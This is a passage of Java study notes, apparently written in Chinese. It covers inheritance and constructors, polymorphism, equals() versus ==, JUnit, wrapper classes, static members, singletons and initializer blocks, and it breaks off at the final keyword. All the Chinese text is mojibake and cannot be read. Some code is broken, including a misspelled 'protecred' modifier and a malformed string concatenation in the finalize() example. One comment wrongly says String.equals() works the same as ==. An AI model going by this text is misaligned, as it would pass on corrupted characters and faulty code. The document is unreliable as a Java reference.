åœ¨ç±»çš„å¤šä¸ªæ„é€ å™¨ä¸­ï¼Œè‡³å°‘æœ‰ä¸€ä¸ªç±»çš„æ„é€ å™¨ä¸­ä½¿ç”¨äº†super(å½¢å‚åˆ—è¡¨)ï¼Œè°ƒç”¨çˆ¶ç±»ä¸­çš„æ„é€ å™¨ å­ç±»å¯¹è±¡å®ä¾‹åŒ–çš„å…¨è¿‡ç¨‹ï¼š 1ï¼ä»ç»“æœä¸Šæ¥çœ‹:(ç»§æ‰¿æ€§) * å­ç±»ç»§æ‰¿çˆ¶ç±»ä»¥åï¼Œå°±è·å–äº†çˆ¶ç±»ä¸­å£°æ˜çš„å±æ€§æˆ–æ–¹æ³•ã€‚ * åˆ›å»ºå­ç±»çš„å¯¹è±¡ï¼Œåœ¨å †ç©ºé—´ä¸­ï¼Œå°±ä¼šåŠ è½½æ‰€æœ‰çˆ¶ç±»ä¸­å£°æ˜çš„å±æ€§ã€‚ 2ï¼ä»è¿‡ç¨‹ä¸Šæ¥çœ‹; * å½“æˆ‘ä»¬é€šè¿‡å­ç±»çš„æ„é€ å™¨åˆ›å»ºå­ç±»å¯¹è±¡æ—¶ï¼Œæˆ‘ä»¬ä¸€å®šä¼šç›´æ¥æˆ–é—´æ¥çš„è°ƒç”¨å…¶çˆ¶ç±»çš„æ„é€ å™¨ï¼Œè¿›è€Œè°ƒç”¨çˆ¶ç±»çš„çˆ¶ç±»çš„æ„é€ å™¨,ç›´åˆ°è°ƒç”¨äº†java.lang.0bjectç±»ä¸­ç©ºå‚çš„æ„é€ å™¨ä¸ºæ­¢ã€‚æ­£å› ä¸ºåŠ è½½è¿‡æ‰€æœ‰çš„çˆ¶ç±»çš„ç»“æ„ï¼Œæ‰€ä»¥æ‰å¯ä»¥çœ‹åˆ°å†…å­˜ä¸­æœ‰çˆ¶ç±»ä¸­çš„ç»“æ„ï¼Œå­ç±»å¯¹è±¡æ‰å¯ä»¥è€ƒè™‘è¿›è¡Œè°ƒç”¨ã€‚ * æ˜ç¡®:è™½ç„¶åˆ›å»ºå­ç±»å¯¹è±¡æ—¶ï¼Œè°ƒç”¨äº†çˆ¶ç±»çš„æ„é€ å™¨ï¼Œä½†æ˜¯è‡ªå§‹è‡³ç»ˆå°±åˆ›å»ºè¿‡ä¸€ä¸ªå¯¹è±¡ï¼Œå³ä¸ºnewçš„å­ç±»å¯¹è±¡ã€‚ å¦‚å­ç±»ï¼š public class Student extends Person{ // extends Person ç»§æ‰¿Personç±» private String major; private int id = 1002; //å­¦å· //æ„é€ æ–¹æ³• public Student() { super(); } public Student(String name, int age, String major) { super(name, age); // superè°ƒç”¨çˆ¶ç±»æ„é€ å™¨ this.major = major; } public int getId() { return id; } public void setId(int id) { this.id = id; } public Student(String major) { super(); this.major = major; } // get public String getMajor() { return major; } // set public void setMajor(String major) { this.major = major; } public void study() { System.out.println("å­¦ä¹ "); } //é‡å†™çˆ¶ç±»æ–¹æ³• @Override public void eat() { System.out.println("å­¦ç”Ÿåº”è¯¥å¤šåƒæœ‰è¥å…»çš„é£Ÿç‰©..."); super.sleep(); } public void show() { System.out.println("å§“åï¼š" + getName() + ", å¹´é¾„ï¼š" + getAge() + "ï¼Œä¸“ä¸šï¼š" + getMajor()); System.out.println(this.getId()); // å­ç±»id System.out.println(super.getId()); // çˆ¶ç±»id } } æµ‹è¯•ç±»ï¼š public class ExtendsTest { public static void main(String[] args) { Person p1 = new Person("å¼ ä¸‰", 18); p1.eat(); Student s1 = new Student("GIS"); s1.setName("å¼ ä¸‰ä¸‰"); s1.setAge(22); // çˆ¶ç±»ä¸­çš„æ–¹æ³•ï¼Œå­ç±»ä¸­ä¹Ÿå¯ä»¥è°ƒç”¨ æ¥å®ç°å¤ç”¨ s1.show(); s1.eat(); Student s2 = new Student("å°æ", 18, "CS"); //superè°ƒç”¨çˆ¶ç±»æ„é€ å™¨, å¯ä»¥ç›´æ¥åœ¨è¿™åˆå§‹åŒ– s2.show(); } } å¤šæ€æ€§(Polymorphism)å¯¹è±¡çš„å¤šæ€æ€§ï¼šçˆ¶ç±»çš„å¼•ç”¨æŒ‡å‘å­ç±»çš„å¯¹è±¡ï¼ˆå¯ä»¥ç›´æ¥åº”ç”¨åœ¨æŠ½è±¡ç±»å’Œæ¥å£ä¸Šï¼‰ Javaå¼•ç”¨å˜é‡æœ‰ä¸¤ä¸ªç±»å‹ï¼š ç¼–è¯‘æ—¶ç±»å‹ï¼šç”±å£°æ˜è¯¥å˜é‡æ—¶å€™ä½¿ç”¨çš„ç±»å‹å†³å®š è¿è¡Œæ—¶ç±»å‹ï¼šç”±å®é™…èµ‹ç»™è¯¥å˜é‡çš„å¯¹è±¡å†³å®š ç®€ç§°ï¼šç¼–è¯‘çœ‹å·¦ï¼Œè¿è¡Œçœ‹å³ è™šæ‹Ÿæ–¹æ³• é—®ï¼šå¤šæ€æ˜¯ç¼–è¯‘æ—¶è¡Œä¸ºè¿˜æ˜¯è¿è¡Œæ—¶è¡Œä¸ºï¼Ÿ ç­”ï¼šè¿è¡Œæ—¶è¡Œä¸º instanceofæ“ä½œç¬¦x instanceof Aï¼šæ£€éªŒxæ˜¯å¦ä¸ºç±»Açš„å¯¹è±¡ï¼Œè¿”å›å€¼ä¸ºbooleanç±»å‹ è¦æ±‚xæ‰€å±çš„ç±»ä¸ç±»Aå¿…é¡»æ˜¯å­ç±»å’Œçˆ¶ç±»çš„å…³ç³»ï¼Œå¦åˆ™ç¼–è¯‘é”™è¯¯ å¦‚æœxå±äºç±»Açš„å­ç±»B(é—´æ¥çˆ¶ç±»å­ç±»å…³ç³»)ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ instanceofæƒ…æ™¯ï¼šä¸ºäº†é¿å…åœ¨å‘ä¸‹è½¬å‹æ—¶å‡ºç°ClassCastExceptionçš„å¼‚å¸¸ï¼Œæˆ‘ä»¬åœ¨å‘ä¸‹è½¬å‹ä¹‹å‰ï¼Œå…ˆè¿›è¡Œinstanceofåˆ¤æ–­ toString()è¾“å‡ºæ ·å¼ï¼Œå¯ä»¥æ‰‹åŠ¨é‡å†™å­ç±»ä¸­çš„è¯¥æ–¹æ³• finalize()å¯¹è±¡å›æ”¶ä¹‹å‰ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼šfinalize()ï¼Œ å­ç±»å¯é‡å†™ //å­ç±»ä¸­ class B{ @Override protecred void finalize() throws Throwable{ System.out.println("å¯¹è±¡è¢«é‡Šæ”¾--> " = this); } ... } //å¼ºåˆ¶æ€§é‡Šæ”¾ç©ºé—´ System.gc(); == ä¸ equals() import java.sql.Date; /* * * == ä¸equals() * * * é¢è¯•é¢˜ï¼š == ä¸equals() åŒºåˆ«ï¼Ÿ * ã€== è¿ç®—ç¬¦ã€‘ 1.å¯ä»¥ä½¿ç”¨åœ¨åŸºæœ¬æ•°æ®ç±»å‹å˜é‡å’Œå¼•ç”¨æ•°æ®ç±»å‹å˜é‡ä¸­ 2.å¦‚æœæ¯”è¾ƒçš„æ˜¯åŸºæœ¬æ•°æ®ç±»å‹å˜é‡:æ¯”è¾ƒä¸¤ä¸ªå˜é‡ä¿å­˜çš„æ•°æ®æ˜¯å¦ç›¸ç­‰(ä¸ä¸€å®šç±»å‹è¦ç›¸åŒ) å¦‚æœæ¯”è¾ƒçš„æ˜¯å¼•ç”¨æ•°æ®ç±»å‹å˜é‡ï¼Œæ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡çš„åœ°å€å€¼æ˜¯å¦ç›¸åŒ.å³ä¸¤ä¸ªå¼•ç”¨æ˜¯å¦æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡å®ä½“ ã€equals()æ–¹æ³•ã€‘ æ˜¯ä¸€ä¸ªæ–¹æ³•ï¼Œè€Œéè¿ç®—ç¬¦ åªèƒ½ç”¨äºå¼•ç”¨æ•°æ®ç±»å‹ åƒStringã€ Dateã€Fileã€åŒ…è£…ç±»ç­‰éƒ½é‡å†™äº†0bjectç±»ä¸­çš„equals()æ–¹æ³•ã€‚é‡å†™ä»¥åï¼Œæ¯”è¾ƒçš„ä¸æ˜¯ä¸¤ä¸ªå¼•ç”¨çš„åœ°å€æ˜¯å¦ç›¸åŒï¼Œè€Œæ˜¯æ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡çš„Tä½“å†…å®¹æ˜¯å¦ç›¸åŒã€‚ ã€é‡å†™Objectç±»ä¸­çš„equals()ã€‘ é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è‡ªå®šä¹‰çš„ç±»å¦‚æœä½¿ç”¨equals()çš„è¯ï¼Œä¹Ÿé€šå¸¸æ˜¯æ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡çš„"å®ä½“å†…å®¹"æ˜¯å¦ç›¸åŒã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬å°±éœ€è¦å¯¹Objectç±»ä¸­çš„equals()è¿›è¡Œé‡å†™ é‡å†™çš„åŸåˆ™ï¼šæ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡çš„å®ä½“å†…å®¹æ˜¯å¦ç›¸åŒ. * */ public class EqualsTest { public static void main(String[] args) { int i = 10; char c = 10; System.out.println( c == i); // true char c1 = 'A'; // asciiç ä¹Ÿä¸º65 char c2 = 65; System.out.println(c1 == c2); //true Customer customer1 = new Customer("xxx"); Customer customer2 = new Customer("xxx"); System.out.println(customer1 == customer2); // false // Stringä¹Ÿæ˜¯å¼•ç”¨å‹æ•°æ® String s1 = new String("asd"); String s2 = new String("asd"); System.out.println(s1 == s2); // false System.out.println(s1.equals(s2)); // true è°ƒç”¨çš„æ˜¯Stringä¸­çš„equals()ï¼Œå’Œ==ä½œç”¨æ˜¯ç›¸åŒçš„ System.out.println(customer1.equals(customer2)); // false è°ƒç”¨çš„æ˜¯Objectä¸­çš„equals, è‡ªå®šä¹‰ä¹‹åå˜ä¸ºtrueäº† Date date1 = new Date(2354534654L); Date date2 = new Date(2354534654L); System.out.println(date1.equals(date2)); //true } } class Customer{ String name; int age; public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public Customer() { } public Customer(String name) { this.name = name; } public Customer(String name, int age) { this.name = name; this.age = age; } //è‡ªå·±æ‰‹åŠ¨é‡å†™Objectç±»ä¸­çš„equals() // é‡å†™åŸåˆ™ï¼š // @Override // public boolean equals(Object obj) { // System.out.println("Customerçš„equals()..."); // if(this == obj) { // return true; // } // if(obj instanceof Customer) { // Customer cust = (Customer)obj; //å¼ºè½¬ // //æ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡çš„æ¯ä¸ªå±æ€§æ˜¯å¦éƒ½ç›¸åŒ // return this.age == cust.age &amp;&amp; this.name.equals(cust.name); // }else { // return false; // } // } //è‡ªåŠ¨é‡å†™çš„ @Override public boolean equals(Object obj) { if (this == obj) return true; if (obj == null) return false; if (getClass() != obj.getClass()) return false; Customer other = (Customer) obj; if (age != other.age) return false; if (name == null) { if (other.name != null) return false; } else if (!name.equals(other.name)) return false; return true; } } é‡å†™equals()æ–¹æ³•çš„åŸåˆ™ï¼š åŒ…è£…ç±»å•å…ƒæµ‹è¯•æ­¥éª¤å¦‚ä¸‹ï¼š package cn.xpshuai.java3; import org.junit.Test; /* * Javaä¸­JUnitå•å…ƒæµ‹è¯• * * æ­¥éª¤ï¼š * 1.é€‰ä¸­å½“å‰å·¥ç¨‹â€“å³é”®é€‰æ‹©: build path - add libraries - JUnit 4 -ä¸‹ä¸€æ­¥ * 2.åˆ›å»ºJavaç±»ï¼Œè¿›è¡Œå•å…ƒæµ‹è¯• * æµ‹è¯•çš„Javaç±»è¦æ±‚ï¼š * 1.æ­¤ç±»æ˜¯publicçš„ * 2.æ­¤ç±»æä¾›å…¬å…±æ˜¯æ— å‚æ•°çš„æ„é€ å™¨ * 3.æ­¤ç±»ä¸­å£°æ˜å•å…ƒæµ‹è¯•æ–¹æ³•ï¼š * æ­¤æ—¶çš„å•å…ƒæµ‹è¯•æ–¹æ³•ï¼šæ–¹æ³•æƒé™ä¸ºpublicï¼Œæ²¡æœ‰è¿”å›å€¼ç±»å‹ã€‚æ²¡æœ‰å½¢å‚ * 4.æ­¤å•å…ƒæµ‹è¯•æ–¹æ³•éœ€è¦å£°æ˜æ³¨è§£ï¼š@Test, å¹¶import org.junit.Test; * * 5.å£°æ˜å¥½å•å…ƒæµ‹è¯•æ–¹æ³•åï¼Œå°±å¯ä»¥åœ¨æ–¹æ³•ä¸­å†™ç›¸å…³æµ‹è¯•ä»£ç  * 6.å†™å®Œä»£ç åï¼ŒåŒå‡»æ–¹æ³•åï¼šå³é”®-->Run As --> JUnit Test * * è¯´æ˜ï¼š * 1.å¦‚æœæ‰§è¡Œç»“æœæ²¡æœ‰ä»»ä½•å¼‚å¸¸:ç»¿æ¡ * 2.... å¼‚å¸¸ï¼šçº¢æ¡ * * */ public class JUnitTest { int num = 10; @Test public void testEquals() { String s1 = new String("y"); String s2 = new String("yyy"); System.out.println(s1 == s2); System.out.println(s1.equals(s2)); System.out.println(num); // å¯ä»¥ç›´æ¥è°ƒç”¨å±æ€§å’Œæ–¹æ³• } @Test public void testToString() { System.out.println(num); } } åŒ…è£…ç±»(Wrapper)çš„ä½¿ç”¨ è®©åŸºæœ¬æ•°æ®ç±»å‹ä¹Ÿå…·æœ‰ç±»çš„ç‰¹å¾ï¼Œå°è£…èµ·æ¥ åŸºæœ¬ç±»å‹ã€åŒ…è£…ç±»ã€Stringä¸‰ç§ç±»å‹ç›¸äº’è½¬æ¢ï¼š package cn.xpshuai.java3; /* * * * */ import org.junit.Test; public class WrapperTest { public static void main(String[] args) { } // 1.åŸºæœ¬æ•°æ®ç±»å‹è½¬æ¢ä¸ºåŒ…è£…ç±»ï¼šè°ƒç”¨åŒ…è£…ç±»çš„æ„é€ å™¨ @Test public void test1() { int num1 = 10; Integer in1 = new Integer(num1); System.out.println(in1.toString()); Integer in2 = new Integer("132"); System.out.println(in2.toString()); Float float1 = new Float("11.1"); System.out.println(float1); Boolean boolean1 = new Boolean("tRuE"); Boolean boolean2 = new Boolean("true123"); System.out.println(boolean1); // true System.out.println(boolean2); // false æ¯”è¾ƒç‰¹åˆ« System.out.println(boolean2); // false æ¯”è¾ƒç‰¹åˆ« Order order = new Order(); System.out.println(order.isMan); // null System.out.println(order.isFemale); // false } // 2.åŒ…è£…ç±»è½¬æ¢ä¸ºåŸºæœ¬æ•°æ®ç±»å‹ï¼šè°ƒç”¨åŒ…è£…ç±»çš„xxxValue() @Test public void test2() { Integer in1 = new Integer(12); // å¯¹è±¡ int i1 = in1.intValue(); // å˜æˆåŸºæœ¬å˜é‡äº† System.out.println(i1 + 11); } // JDK5.0æ–°ç‰¹æ€§ï¼šè‡ªåŠ¨è£…ç®±ä¸æ‹†ç®±ï¼Œç”¨ä¸ç€ï¼ˆ.åŸºæœ¬æ•°æ®ç±»å‹è½¬æ¢ä¸ºåŒ…è£…ç±»ï¼šè°ƒç”¨åŒ…è£…ç±»çš„æ„é€ å™¨ï¼‰ @Test public void test3() { int num1 = 10; // åŸºæœ¬æ•°æ®ç±»å‹-->åŒ…è£…ç±»çš„å¯¹è±¡ // method1(num1); // æ–°ç‰¹æ€§ï¼šè‡ªåŠ¨è£…ç®± int num2 = 11; //è‡ªåŠ¨è£…ç®± Integer in2 = num2; boolean isFlag = true; //è‡ªåŠ¨è£…ç®± Boolean isFlag2 = isFlag; // æ–°ç‰¹æ€§ï¼šè‡ªåŠ¨æ‹†ç®±ï¼ˆåŒ…è£…ç±»è½¬æ¢ä¸ºåŸºæœ¬æ•°æ®ç±»å‹ï¼‰ int num3 = in2; // è‡ªåŠ¨æ‹†ç®± } public void method1(Object obj) { System.out.println(obj); } // 3.åŸºæœ¬æ•°æ®ç±»å‹ã€åŒ…è£…ç±» -->è½¬æ¢ä¸ºStringç±»å‹ @Test public void test4() { // æ–¹å¼1ï¼šè¿æ¥è¿ç®— int num1 = 10; String str1= num1 + ""; //æ–¹å¼2ï¼šè°ƒç”¨Stringé‡è½½çš„valueof(xxx xxx) float f2 = 12.3f; String string = String.valueOf(f2); System.out.println(string); // "12.3" Double d1 = new Double(12.5); String string2 = String.valueOf(d1); System.out.println(string2); } // 3.Stringç±»å‹ -->è½¬æ¢ä¸ºåŸºæœ¬æ•°æ®ç±»å‹ã€åŒ…è£…ç±»ï¼šè°ƒç”¨åŒ…è£…ç±»çš„parseXXXæ–¹æ³• @Test public void test5() { String str1 = "123"; //è®°ä½ int num2 = Integer.parseInt(str1); System.out.println(num2); //123 } } class Order{ Boolean isMan; boolean isFemale; } Vector()å¯ä»¥ä»£æ›¿æ•°ç»„ï¼Œåç»­å†è¯´â€¦ å…³é”®å­—ï¼šstaticæ— è®ºäº§ç”Ÿäº†å¤šå°‘ä¸ªå¯¹è±¡ï¼Œåªå¸Œæœ›æŸäº›ç‰¹å®šçš„æ•°æ®åœ¨å†…å­˜ç©ºé—´ä¸­åªæœ‰ä¸€ä»½ staticå¯ä»¥ç”¨æ¥ä¿®é¥°ï¼šå±æ€§ã€æ–¹æ³•ã€ä»£ç å—ã€å†…éƒ¨ç±» staticä¿®é¥°å±æ€§ï¼šé™æ€å˜é‡ å±æ€§æŒ‰ç…§æ˜¯å¤Ÿä½¿ç”¨staticä¿®é¥°åˆ†ä¸ºï¼šé™æ€å±æ€§ vs éé™æ€å±æ€§(å®ä¾‹å˜é‡) å®ä¾‹å˜é‡ï¼šåˆ›å»ºçš„å¤šä¸ªå¯¹è±¡ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½ç‹¬ç«‹æ‹¥æœ‰ä¸€å¥—ç±»ä¸­çš„éé™æ€å±æ€§ã€‚å½“ä¿®æ”¹å…¶ä¸­ä¸€ä¸ªéé™æ€å±æ€§æ—¶ä¸ä¼šå½±å“å¦ä¸€ä¸ªå¯¹è±¡ä¸­ç›¸åŒå±æ€§å€¼çš„ä¿®æ”¹ é™æ€å±æ€§ï¼šåˆ›å»ºäº†ç±»çš„å¤šä¸ªå¯¹è±¡ï¼Œå…¬ç”¨åŒä¸€ä¸ªé™æ€å˜é‡ï¼Œå½“é€šè¿‡æŸä¸€ä¸ªå¯¹è±¡ä¿®æ”¹è¯¥é™æ€å˜é‡æ—¶ï¼Œä¼šå¯¼è‡´å…¶ä»–å¯¹è±¡è°ƒç”¨è¯¥é™æ€å˜é‡æ—¶æ˜¯ä¿®æ”¹è¿‡çš„ * * (1)é™æ€å˜é‡éšç€ç±»çš„åŠ è½½è€ŒåŠ è½½: "ç±».é™æ€å˜é‡"æ–¹å¼è¿›è¡Œè°ƒç”¨ * (2)é™æ€å˜é‡çš„åŠ è½½è¦æ—©äºå¯¹è±¡çš„åˆ›å»º * (3)ç”±äºç±»åªä¼šè®°è½½ä¸€æ¬¡ï¼Œåˆ™é™æ€å˜é‡åœ¨å†…å­˜ä¸­ä¹Ÿä¼šåªå­˜åœ¨ä¸€ä»½ï¼šå­˜åœ¨æ–¹æ³•åŒºçš„é™æ€åŸŸ * ä¸¾ä¾‹ï¼šSystem.out Math.PI staticä¿®é¥°æ–¹æ³•ï¼š é™æ€æ–¹æ³•éšç€ç±»çš„åŠ è½½è€ŒåŠ è½½: "ç±».é™æ€æ–¹æ³•"æ–¹å¼è¿›è¡Œè°ƒç”¨ é™æ€æ–¹æ³•ä¸­ï¼Œåªèƒ½è°ƒç”¨é™æ€çš„æ–¹æ³•æˆ–å±æ€§ éé™æ€æ–¹æ³•ä¸­ï¼Œæ—¢å¯ä»¥è°ƒç”¨éé™æ€çš„æ–¹æ³•æˆ–å±æ€§ï¼Œä¹Ÿå¯ä»¥è°ƒç”¨é™æ€çš„æ–¹æ³•æˆ–å±æ€§ åœ¨é™æ€çš„æ–¹æ³•å†…ï¼Œä¸èƒ½ä½¿ç”¨thiså…³é”®å­—ã€superå…³é”®å­— å…³äºé™æ€å±æ€§å’Œé™æ€æ–¹æ³•çš„ä½¿ç”¨ï¼Œå¤§å®¶éƒ½ä»ç”Ÿå‘½å‘¨æœŸçš„è§’åº¦å»ç†è§£ã€‚ /* * åœ¨å¼€å‘ä¸­ï¼Œå¦‚ä½•ç¡®å®šä¸€ä¸ªå±æ€§æ˜¯å¦éœ€è¦å£°æ˜ä¸ºstaticï¼š * >å±æ€§æ˜¯å¯ä»¥è¢«å¤šä¸ªå¯¹è±¡æ‰€å…±äº«çš„ï¼Œä¸ä¼šéšç€å¯¹è±¡çš„ä¸åŒè€Œæœ¬åŒçš„ã€‚ * åœ¨å¼€å‘ä¸­ï¼Œå¦‚ä½•ç¡®å®šä¸€ä¸ªæ–¹æ³•æ˜¯å¦éœ€è¦å£°æ˜ä¸ºstaticï¼š * >æ“ä½œé™æ€å±æ€§çš„æ–¹æ³•ï¼Œé€šå¸¸è®¾ç½®ä¸ºstaticçš„ * >å·¥å…·ç±»ä¸­çš„æ–¹æ³•ï¼Œä¹ æƒ¯ä¸Šå£°æ˜ä¸ºstaticçš„,æ¯”å¦‚ Math, Collection, Arrats */ public class StaticClass { public static void main(String[] args) { Chinese.nation = "CHN"; Chinese c1 = new Chinese(); c1.name = "å§šæ˜"; c1.age = 40; // c1.nation = "CHN"; Chinese c2 = new Chinese(); c2.name = "é©¬é¾™"; c2.age = 30; System.out.println(c2.nation); // ç›´æ¥ "ç±».æ–¹æ³•" è°ƒç”¨ Chinese.show(); } } class Chinese{ String name; int age; static String nation; public static void show() { System.out.println("æˆ‘æ˜¯ä¸€ä¸ªä¸­å›½äººï¼ï¼ï¼"); Chinese.nation ="CHN"; // Name = "YYY"; } public void show2() { System.out.println("æˆ‘æ˜¯ä¸€ä¸ªä¸­å›½äºº2ï¼ï¼ï¼"); Chinese.nation ="CHN"; System.out.println(this.name); } } ç±»å˜é‡å’Œå®ä¾‹å˜é‡å†…å­˜è§£æ å•ä¾‹æ¨¡å¼package cn.xpshuai.java4; /* * å•ä¾‹(SingleTon)è®¾è®¡æ¨¡å¼ï¼š * 1.å®šä¹‰ï¼šæŸä¸ªç±»åªèƒ½å­˜åœ¨ä¸€ä¸ªå®ä¾‹ * 2.å¦‚ä½•å®ç° * é¥¿æ±‰å¼å•ä¾‹æ¨¡å¼ vs æ‡’æ±‰å¼å•ä¾‹æ¨¡å¼ * * 3.åŒºåˆ†é¥¿æ±‰å¼ã€æ‡’æ±‰å¼ * é¥¿æ±‰å¼ï¼š åå¤„ï¼šå¯¹è±¡åŠ è½½æ—¶é—´è¿‡é•¿ã€‚ * å¥½å¤„ï¼šæ˜¯çº¿ç¨‹å®‰å…¨çš„ * æ‡’æ±‰å¼ï¼šå¥½å¤„ï¼šå»¶è¿Ÿå¯¹è±¡åˆ›å»º * ç›®å‰ä¸‹é¢çš„å†™æ³•åå¤„ï¼šçº¿ç¨‹ä¸å®‰å…¨ -->å¤šçº¿ç¨‹ç« èŠ‚å†ä¿®æ”¹ * * 4.å•ä¾‹æ¨¡å¼ä¼˜ç‚¹ï¼šå‡å°‘äº†ç³»ç»Ÿçš„å¼€é”€ * * 5.å•ä¾‹æ¨¡å¼ä½¿ç”¨åœºæ™¯ï¼š * */ public class SingleTonTest { public static void main(String[] args) { // é¥¿æ±‰å¼æµ‹è¯• // bank1å’Œbank2æ˜¯ä¸€ä¸ªå¯¹è±¡ Bank bank1 = Bank.getIntance(); Bank bank2 = Bank.getIntance(); System.out.println(bank1 == bank2); // æ‡’æ±‰å¼æµ‹è¯• Order order1 = Order.getInstance(); Order order2 = Order.getInstance(); System.out.println(order1 == order2); } } // ã€é¥¿æ±‰å¼å•ä¾‹æ¨¡å¼ã€‘ class Bank{ // 1.ç§æœ‰åŒ–ç±»çš„æ„é€ å™¨ï¼šä¸ºäº†é¿å…åœ¨å¤–é¢ç±»è°ƒç”¨è¯¥æ„é€ å™¨ private Bank() { } // 2.å†…éƒ¨åˆ›å»ºç±»çš„å¯¹è±¡ // 4.è¦æ±‚æ­¤å¯¹è±¡ä¹Ÿå¿…é¡»æ˜¯staticçš„ private static Bank instance1 = new Bank(); //å…ˆåˆ›å»º //3.æä¾›å…¬å…±é™æ€æ–¹æ³•ï¼Œè¿”å›ç±»çš„å¯¹è±¡(ç±»ä¼¼getXXXæ–¹æ³•) public static Bank getIntance() { return instance1; } } //ã€æ‡’æ±‰å¼å•ä¾‹æ¨¡å¼ã€‘ class Order{ // 1.ç§æœ‰åŒ–ç±»çš„æ„é€ å™¨ private Order(){ } // 2.å£°æ˜å½“å‰ç±»å¯¹è±¡ï¼ˆæ²¡æœ‰åˆå§‹åŒ–ï¼‰ // 4.æ­¤å¯¹è±¡ä¹Ÿå¿…é¡»å£°æ˜ä¸ºstatic private static Order instance2 = null; // 3.å£°æ˜publicã€staticçš„è¿”å›å½“å‰ç±»å¯¹è±¡çš„æ–¹æ³• public static Order getInstance() { if(instance2 == null) { instance2 = new Order(); } return instance2; } } ä¸€ä¸ª.javaæºæ–‡ä»¶åªèƒ½æœ‰ä¸€ä¸ªpublicçš„ç±» ä»£ç å—package cn.xpshuai.java4; /* * ç±»æˆå‘˜4ï¼šä»£ç å—ï¼ˆæˆ–åˆå§‹åŒ–å—ï¼‰ * * 1.ä»£ç å—ä½œç”¨ï¼šç”¨æ¥åˆå§‹åŒ–ç±»ã€å¯¹è±¡ * 2.å¦‚æœæœ‰ä¿®é¥°çš„è¯ï¼Œåªèƒ½ç”¨staticæ¥ä¿®é¥° * 3.åˆ†ç±»ï¼šé™æ€ä»£ç å— vs éé™æ€ä»£ç å— * é™æ€ä»£ç å—ï¼š * >å†…éƒ¨å¯ä»¥æœ‰è¾“å‡ºè¯­å¥ * >éšç€ç±»çš„åŠ è½½è€Œæ‰§è¡Œï¼Œä¸”åªæ‰§è¡Œä¸€æ¬¡ * >ä½œç”¨ï¼šåˆå§‹åŒ–ç±»çš„ä¿¡æ¯ * >å¦‚æœä¸€ä¸ªç±»ä¸­å®šä¹‰å¤šä¸ªé™æ€ä»£ç å—ï¼ŒæŒ‰ç…§å£°æ˜ä¼˜å…ˆé¡ºåºæ‰§è¡Œ * >é™æ€ä»£ç å—è¦ä¼˜å…ˆäºéé™æ€ä»£ç å—çš„æ‰§è¡Œ * >åªèƒ½è°ƒç”¨é™æ€ç»“æ„ï¼Œä¸èƒ½è°ƒç”¨éé™æ€å±æ€§å’Œæ–¹æ³• * * éé™æ€ä»£ç å—ï¼š * >å†…éƒ¨å¯ä»¥æœ‰è¾“å‡ºè¯­å¥ * >éšç€å¯¹è±¡çš„åˆ›å»ºè€Œæ‰§è¡Œï¼Œæ¯åˆ›å»ºä¸€ä¸ªå¯¹è±¡å°±æ‰§è¡Œä¸€æ¬¡éé™æ€ä»£ç å— * >ä½œç”¨ï¼šå¯ä»¥åœ¨åˆ›å»ºå¯¹è±¡æ—¶å¯¹å¯¹è±¡çš„å±æ€§è¿›è¡Œåˆå§‹åŒ– * >å¦‚æœä¸€ä¸ªç±»ä¸­å®šä¹‰å¤šä¸ªéé™æ€ä»£ç å—ï¼ŒæŒ‰ç…§å£°æ˜ä¼˜å…ˆé¡ºåºæ‰§è¡Œ * >å¯ä»¥è°ƒç”¨éé™æ€å±æ€§å’Œæ–¹æ³•ä»¥åŠé™æ€å±æ€§å’Œæ–¹æ³• * éé™æ€ä»£ç å—æ‰§è¡Œé¡ºåºå…ˆäºæ„é€ å™¨ * * * å¯¹å±æ€§å¯ä»¥èµ‹å€¼çš„ä½ç½®ï¼šæŒ‰é¡ºåºæ’ * 1.é»˜è®¤åˆå§‹åŒ– * 2.æ˜¾å¼åˆå§‹åŒ– / 3.åœ¨ä»£ç å—ä¸­èµ‹å€¼ * 4.æ„é€ å™¨åˆå§‹åŒ– * 5.æœ‰å¯¹è±¡ä¹‹åï¼Œé€šè¿‡"å¯¹è±¡.å±æ€§" æˆ– "å¯¹è±¡.æ–¹æ³•"æ–¹å¼è¿›è¡Œèµ‹å€¼ * * * * å¼€å‘ä¸­ä½¿ç”¨ä»£ç å—(ä½¿ç”¨é¢‘ç‡ä¸é«˜)ï¼š * * * ç”±çˆ¶åŠå­ï¼Œå…ˆé™åæ„ * * */ public class BlockTest { public static void main(String[] args) { String desc = Person.desc; Person p1 = new Person(); System.out.println(desc); } } class Person{ //å±æ€§ String name; int age; static String desc = "æˆ‘æ˜¯ä¸€ä¸ªäºº"; //æ„é€ å™¨ public Person() { } public Person(String name, int age) { super(); this.name = name; this.age = age; } //éé™æ€ä»£ç å—ä»£ç å— { System.out.println("helloéé™æ€ä»£ç å—1"); // è°ƒç”¨éé™æ€ç»“æ„ age = 1; // eat(); // è°ƒç”¨é™æ€ç»“æ„ info(); desc = "hhhhhh"; } { System.out.println("helloéé™æ€ä»£ç å—2"); age = 1; // } //é™æ€ä»£ç å— static{ System.out.println("helloé™æ€ä»£ç å—1"); // åªèƒ½è°ƒç”¨é™æ€ç»“æ„ info(); desc = "é‡æ–°èµ‹å€¼ï¼Œæˆ‘æ˜¯ä¸€ä¸ªçˆ±å­¦ä¹ çš„äºº1"; } static{ System.out.println("helloé™æ€ä»£ç å—1"); desc = "é‡æ–°èµ‹å€¼ï¼Œæˆ‘æ˜¯ä¸€ä¸ªçˆ±å­¦ä¹ çš„äºº2"; } //æ–¹æ³• public void eat() { System.out.println("äººåƒé¥­"); } @Override public String toString() { return "Person [name=" + name + ", age=" + age + "]"; } public static void info() { System.out.println("æˆ‘æ˜¯ä¸€ä¸ªå¿«ä¹çš„äºº"); } } final å…³é”®å­—finalå¯ä»¥ä¿®é¥°çš„ç»“æ„ï¼šç±»ã€æ–¹æ³•ã€å˜é‡ package cn.xpshuai.java4; /* *å…³é”®å­—ï¼šfinal * * 